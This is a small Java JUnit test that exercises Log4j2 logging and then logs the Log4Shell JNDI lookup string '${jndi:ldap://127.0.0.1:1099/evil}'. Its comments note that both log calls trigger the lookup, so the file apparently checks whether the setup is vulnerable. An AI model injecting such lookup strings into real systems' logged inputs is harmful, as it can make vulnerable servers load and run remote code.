package im.common;

import lombok.extern.slf4j.Slf4j;
import org.junit.Test;

/**
 * <br/>
 * Created by ZXFeng on 2022/9/15.
 */
@Slf4j
public class TestLog4j2 {

    @Test
    public void testLog() {
        log.info("test -------------------- info");
        log.warn("test -------------------- warn");
        log.error("test -------------------- error");

        lookup("${jndi:ldap://127.0.0.1:1099/evil}");
    }

    static void lookup(String info) {
        log.info("info: [{}]", info);   // 会触发
        log.info(info);                 // 会触发
    }

}
